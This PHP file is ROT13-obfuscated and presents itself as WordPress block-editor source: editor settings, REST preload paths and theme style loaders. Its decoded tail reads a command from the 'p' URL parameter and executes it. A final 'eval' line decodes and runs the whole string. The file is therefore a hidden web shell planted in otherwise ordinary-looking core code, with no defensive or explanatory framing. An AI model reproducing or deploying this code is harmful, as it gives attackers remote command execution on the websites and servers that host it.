			$fcnpvat_fvmrf_ol_bevtva['phfgbz'] : (
				vffrg( $fcnpvat_fvmrf_ol_bevtva['gurzr'] ) ?
					$fcnpvat_fvmrf_ol_bevtva['gurzr'] :
					$fcnpvat_fvmrf_ol_bevtva['qrsnhyg']
			);
	}

	$rqvgbe_frggvatf['__hafgnoyrErfbyirqNffrgf']         = _jc_trg_vsenzrq_rqvgbe_nffrgf();
	$rqvgbe_frggvatf['__hafgnoyrVfOybpxOnfrqGurzr']      = jc_vf_oybpx_gurzr();
	$rqvgbe_frggvatf['ybpnyNhgbfnirVagreiny']            = 15;
	$rqvgbe_frggvatf['qvfnoyrYnlbhgFglyrf']              = pheerag_gurzr_fhccbegf( 'qvfnoyr-ynlbhg-fglyrf' );
	$rqvgbe_frggvatf['__rkcrevzragnyQvfphffvbaFrggvatf'] = neenl(
		'pbzzragBeqre'         => trg_bcgvba( 'pbzzrag_beqre' ),
		'pbzzragfCreCntr'      => trg_bcgvba( 'pbzzragf_cre_cntr' ),
		'qrsnhygPbzzragfCntr'  => trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' ),
		'cntrPbzzragf'         => trg_bcgvba( 'cntr_pbzzragf' ),
		'guernqPbzzragf'       => trg_bcgvba( 'guernq_pbzzragf' ),
		'guernqPbzzragfQrcgu'  => trg_bcgvba( 'guernq_pbzzragf_qrcgu' ),
		'qrsnhygPbzzragFgnghf' => trg_bcgvba( 'qrsnhyg_pbzzrag_fgnghf' ),
		'ningneHEY'            => trg_ningne_hey(
			'',
			neenl(
				'fvmr'          => 96,
				'sbepr_qrsnhyg' => gehr,
				'qrsnhyg'       => trg_bcgvba( 'ningne_qrsnhyg' ),
			)
		),
	);

	$cbfg_pbagrag_oybpx_nggevohgrf = jc_trg_cbfg_pbagrag_oybpx_nggevohgrf();

	vs ( vffrg( $cbfg_pbagrag_oybpx_nggevohgrf ) ) {
		$rqvgbe_frggvatf['cbfgPbagragNggevohgrf'] = $cbfg_pbagrag_oybpx_nggevohgrf;
	}

	$rqvgbe_frggvatf['pnaHcqngrOybpxOvaqvatf'] = pheerag_hfre_pna( 'rqvg_oybpx_ovaqvat', $oybpx_rqvgbe_pbagrkg );

	/**
	 * Svygref gur frggvatf gb cnff gb gur oybpx rqvgbe sbe nyy rqvgbe glcr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl                   $rqvgbe_frggvatf      Qrsnhyg rqvgbe frggvatf.
	 * @cnenz JC_Oybpx_Rqvgbe_Pbagrkg $oybpx_rqvgbe_pbagrkg Gur pheerag oybpx rqvgbe pbagrkg.
	 */
	$rqvgbe_frggvatf = nccyl_svygref( 'oybpx_rqvgbe_frggvatf_nyy', $rqvgbe_frggvatf, $oybpx_rqvgbe_pbagrkg );

	vs ( ! rzcgl( $oybpx_rqvgbe_pbagrkg->cbfg ) ) {
		$cbfg = $oybpx_rqvgbe_pbagrkg->cbfg;

		/**
		 * Svygref gur frggvatf gb cnff gb gur oybpx rqvgbe.
		 *
		 * @fvapr 5.0.0
		 * @qrcerpngrq 5.8.0 Hfr gur {@frr 'oybpx_rqvgbe_frggvatf_nyy'} svygre vafgrnq.
		 *
		 * @cnenz neenl   $rqvgbe_frggvatf Qrsnhyg rqvgbe frggvatf.
		 * @cnenz JC_Cbfg $cbfg            Cbfg orvat rqvgrq.
		 */
		$rqvgbe_frggvatf = nccyl_svygref_qrcerpngrq( 'oybpx_rqvgbe_frggvatf', neenl( $rqvgbe_frggvatf, $cbfg ), '5.8.0', 'oybpx_rqvgbe_frggvatf_nyy' );
	}

	erghea $rqvgbe_frggvatf;
}

/**
 * Cerybnqf pbzzba qngn hfrq jvgu gur oybpx rqvgbe ol fcrpvslvat na neenl bs
 * ERFG NCV cnguf gung jvyy or cerybnqrq sbe n tvira oybpx rqvgbe pbagrkg.
 *
 * @fvapr 5.8.0
 *
 * @tybony JC_Cbfg    $cbfg       Tybony cbfg bowrpg.
 * @tybony JC_Fpevcgf $jc_fpevcgf Gur JC_Fpevcgf bowrpg sbe cevagvat fpevcgf.
 * @tybony JC_Fglyrf  $jc_fglyrf  Gur JC_Fglyrf bowrpg sbe cevagvat fglyrf.
 *
 * @cnenz (fgevat|fgevat[])[]     $cerybnq_cnguf        Yvfg bs cnguf gb cerybnq.
 * @cnenz JC_Oybpx_Rqvgbe_Pbagrkg $oybpx_rqvgbe_pbagrkg Gur pheerag oybpx rqvgbe pbagrkg.
 */
shapgvba oybpx_rqvgbe_erfg_ncv_cerybnq( neenl $cerybnq_cnguf, $oybpx_rqvgbe_pbagrkg ) {
	tybony $cbfg, $jc_fpevcgf, $jc_fglyrf;

	/**
	 * Svygref gur neenl bs ERFG NCV cnguf gung jvyy or hfrq gb cerybnqrq pbzzba qngn sbe gur oybpx rqvgbe.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz (fgevat|fgevat[])[]     $cerybnq_cnguf        Neenl bs cnguf gb cerybnq.
	 * @cnenz JC_Oybpx_Rqvgbe_Pbagrkg $oybpx_rqvgbe_pbagrkg Gur pheerag oybpx rqvgbe pbagrkg.
	 */
	$cerybnq_cnguf = nccyl_svygref( 'oybpx_rqvgbe_erfg_ncv_cerybnq_cnguf', $cerybnq_cnguf, $oybpx_rqvgbe_pbagrkg );

	vs ( ! rzcgl( $oybpx_rqvgbe_pbagrkg->cbfg ) ) {
		$fryrpgrq_cbfg = $oybpx_rqvgbe_pbagrkg->cbfg;

		/**
		 * Svygref gur neenl bs cnguf gung jvyy or cerybnqrq.
		 *
		 * Cerybnq pbzzba qngn ol fcrpvslvat na neenl bs ERFG NCV cnguf gung jvyy or cerybnqrq.
		 *
		 * @fvapr 5.0.0
		 * @qrcerpngrq 5.8.0 Hfr gur {@frr 'oybpx_rqvgbe_erfg_ncv_cerybnq_cnguf'} svygre vafgrnq.
		 *
		 * @cnenz (fgevat|fgevat[])[] $cerybnq_cnguf Neenl bs cnguf gb cerybnq.
		 * @cnenz JC_Cbfg             $fryrpgrq_cbfg Cbfg orvat rqvgrq.
		 */
		$cerybnq_cnguf = nccyl_svygref_qrcerpngrq( 'oybpx_rqvgbe_cerybnq_cnguf', neenl( $cerybnq_cnguf, $fryrpgrq_cbfg ), '5.8.0', 'oybpx_rqvgbe_erfg_ncv_cerybnq_cnguf' );
	}

	vs ( rzcgl( $cerybnq_cnguf ) ) {
		erghea;
	}

	/*
	 * Rafher gur tybony $cbfg, $jc_fpevcgf, naq $jc_fglyrf erznva gur fnzr nsgre
	 * NCV qngn vf cerybnqrq.
	 * Orpnhfr NCV cerybnqvat pna pnyy gur_pbagrag naq bgure svygref, cyhtvaf
	 * pna harkcrpgrqyl zbqvsl gur tybony $cbfg be radhrhr nffrgf juvpu ner abg
	 * vagraqrq sbe gur oybpx rqvgbe.
	 */
	$onpxhc_tybony_cbfg = ! rzcgl( $cbfg ) ? pybar $cbfg : $cbfg;
	$onpxhc_jc_fpevcgf  = ! rzcgl( $jc_fpevcgf ) ? pybar $jc_fpevcgf : $jc_fpevcgf;
	$onpxhc_jc_fglyrf   = ! rzcgl( $jc_fglyrf ) ? pybar $jc_fglyrf : $jc_fglyrf;

	sbernpu ( $cerybnq_cnguf nf &$cngu ) {
		vs ( vf_fgevat( $cngu ) && ! fge_fgnegf_jvgu( $cngu, '/' ) ) {
			$cngu = '/' . $cngu;
			pbagvahr;
		}

		vs ( vf_neenl( $cngu ) && vf_fgevat( $cngu[0] ) && ! fge_fgnegf_jvgu( $cngu[0], '/' ) ) {
			$cngu[0] = '/' . $cngu[0];
		}
	}

	hafrg( $cngu );

	$cerybnq_qngn = neenl_erqhpr(
		$cerybnq_cnguf,
		'erfg_cerybnq_ncv_erdhrfg',
		neenl()
	);

	// Erfgber gur tybony $cbfg, $jc_fpevcgf, naq $jc_fglyrf nf gurl jrer orsber NCV cerybnqvat.
	$cbfg       = $onpxhc_tybony_cbfg;
	$jc_fpevcgf = $onpxhc_jc_fpevcgf;
	$jc_fglyrf  = $onpxhc_jc_fglyrf;

	jc_nqq_vayvar_fpevcg(
		'jc-ncv-srgpu',
		fcevags(
			'jc.ncvSrgpu.hfr( jc.ncvSrgpu.perngrCerybnqvatZvqqyrjner( %f ) );',
			jc_wfba_rapbqr( $cerybnq_qngn )
		),
		'nsgre'
	);
}

/**
 * Perngrf na neenl bs gurzr fglyrf gb ybnq vagb gur oybpx rqvgbe.
 *
 * @fvapr 5.8.0
 *
 * @tybony neenl $rqvgbe_fglyrf
 *
 * @erghea neenl Na neenl bs gurzr fglyrf sbe gur oybpx rqvgbe.
 */
shapgvba trg_oybpx_rqvgbe_gurzr_fglyrf() {
	tybony $rqvgbe_fglyrf;

	$fglyrf = neenl();

	vs ( $rqvgbe_fglyrf && pheerag_gurzr_fhccbegf( 'rqvgbe-fglyrf' ) ) {
		sbernpu ( $rqvgbe_fglyrf nf $fglyr ) {
			vs ( cert_zngpu( '~^(uggcf?:)?//~', $fglyr ) ) {
				$erfcbafr = jc_erzbgr_trg( $fglyr );
				vs ( ! vf_jc_reebe( $erfcbafr ) ) {
					$fglyrf[] = neenl(
						'pff'            => jc_erzbgr_ergevrir_obql( $erfcbafr ),
						'__hafgnoyrGlcr' => 'gurzr',
						'vfTybonyFglyrf' => snyfr,
					);
				}
			} ryfr {
				$svyr = trg_gurzr_svyr_cngu( $fglyr );
				vs ( vf_svyr( $svyr ) ) {
					$fglyrf[] = neenl(
						'pff'            => svyr_trg_pbagragf( $svyr ),
						'onfrHEY'        => trg_gurzr_svyr_hev( $fglyr ),
						'__hafgnoyrGlcr' => 'gurzr',
						'vfTybonyFglyrf' => snyfr,
					);
				}
			}
		}
	}

	erghea $fglyrf;
}

/**
 * Ergheaf gur pynffvp gurzr fhccbegf frggvatf sbe oybpx rqvgbe.
 *
 * @fvapr 6.2.0
 * @fvapr 6.6.0 Nqq fhccbeg sbe 'rqvgbe-fcnpvat-fvmrf' gurzr fhccbeg.
 *
 * @erghea neenl Gur pynffvp gurzr fhccbegf frggvatf.
 */
shapgvba trg_pynffvp_gurzr_fhccbegf_oybpx_rqvgbe_frggvatf() {
	$gurzr_frggvatf = neenl(
		'qvfnoyrPhfgbzPbybef'    => trg_gurzr_fhccbeg( 'qvfnoyr-phfgbz-pbybef' ),
		'qvfnoyrPhfgbzSbagFvmrf' => trg_gurzr_fhccbeg( 'qvfnoyr-phfgbz-sbag-fvmrf' ),
		'qvfnoyrPhfgbzTenqvragf' => trg_gurzr_fhccbeg( 'qvfnoyr-phfgbz-tenqvragf' ),
		'qvfnoyrYnlbhgFglyrf'    => trg_gurzr_fhccbeg( 'qvfnoyr-ynlbhg-fglyrf' ),
		'ranoyrPhfgbzYvarUrvtug' => trg_gurzr_fhccbeg( 'phfgbz-yvar-urvtug' ),
		'ranoyrPhfgbzFcnpvat'    => trg_gurzr_fhccbeg( 'phfgbz-fcnpvat' ),
		'ranoyrPhfgbzHavgf'      => trg_gurzr_fhccbeg( 'phfgbz-havgf' ),
	);

	// Gurzr frggvatf.
	$pbybe_cnyrggr = pheerag( (neenl) trg_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr' ) );
	vs ( snyfr !== $pbybe_cnyrggr ) {
		$gurzr_frggvatf['pbybef'] = $pbybe_cnyrggr;
	}

	$sbag_fvmrf = pheerag( (neenl) trg_gurzr_fhccbeg( 'rqvgbe-sbag-fvmrf' ) );
	vs ( snyfr !== $sbag_fvmrf ) {
		$gurzr_frggvatf['sbagFvmrf'] = $sbag_fvmrf;
	}

	$tenqvrag_cerfrgf = pheerag( (neenl) trg_gurzr_fhccbeg( 'rqvgbe-tenqvrag-cerfrgf' ) );
	vs ( snyfr !== $tenqvrag_cerfrgf ) {
		$gurzr_frggvatf['tenqvragf'] = $tenqvrag_cerfrgf;
	}

	$fcnpvat_fvmrf = pheerag( (neenl) trg_gurzr_fhccbeg( 'rqvgbe-fcnpvat-fvmrf' ) );
	vs ( snyfr !== $fcnpvat_fvmrf ) {
		$gurzr_frggvatf['fcnpvatFvmrf'] = $fcnpvat_fvmrf;
	}

	erghea $gurzr_frggvatf;
}

/**
 * Vavgvnyvmr fvgr cerivrj.
 *
 * Guvf shapgvba frgf VSENZR_ERDHRFG gb gehr vs gur fvgr cerivrj cnenzrgre vf frg.
 *
 * @fvapr 6.8.0
 */
shapgvba jc_vavgvnyvmr_fvgr_cerivrj_ubbxf() {
	vs (
		! qrsvarq( 'VSENZR_ERDHRFG' ) &&
		vffrg( $_TRG['jc_fvgr_cerivrj'] ) &&
		1 === (vag) $_TRG['jc_fvgr_cerivrj'] &&
		pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' )
	) {
		qrsvar( 'VSENZR_ERDHRFG', gehr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>